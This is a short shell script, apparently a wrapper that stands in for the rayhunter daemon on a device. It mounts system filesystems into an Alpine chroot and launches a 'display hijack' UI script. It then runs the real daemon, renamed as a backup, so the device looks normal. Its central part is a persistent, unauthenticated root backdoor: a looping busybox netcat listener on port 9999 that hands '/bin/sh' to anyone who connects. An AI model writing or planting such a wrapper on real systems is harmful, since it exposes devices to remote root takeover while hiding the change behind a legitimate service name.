#!/bin/sh
# HIJACK WRAPPER V4 - The Fixer

LOG="/data/rayhunter/hijack.log"
echo "[-] V4 Startup: $(date)" >> $LOG

# 1. Force Remount (Clean Slate)
umount /data/alpine/proc 2>/dev/null
umount /data/alpine/sys 2>/dev/null
umount /data/alpine/dev 2>/dev/null

mount -t proc proc /data/alpine/proc
mount -t sysfs sys /data/alpine/sys
mount -o bind /dev /data/alpine/dev

echo "[+] Remounted." >> $LOG

# 2. Launch Root Backdoor (Port 9999) - OUTSIDE CHROOT
# We use the system shell to ensure it works.
if ! netstat -tlpn | grep 9999; then
    echo "[-] Spawning SYSTEM Root Backdoor on 9999..." >> $LOG
    # Busybox nc -l -p 9999 -e /bin/sh
    (while true; do /bin/busybox nc -ll -p 9999 -e /bin/sh; sleep 1; done) &
fi

# 3. Launch FOAC UI (Persistent Display Hijack)
if [ -f /data/rayhunter/start_foac_v2.sh ]; then
    echo "[-] Launching FOAC UI..." >> $LOG
    /bin/sh /data/rayhunter/start_foac_v2.sh &
fi

# 4. Launch Real Daemon
exec /data/rayhunter/rayhunter-daemon.bak "$@"
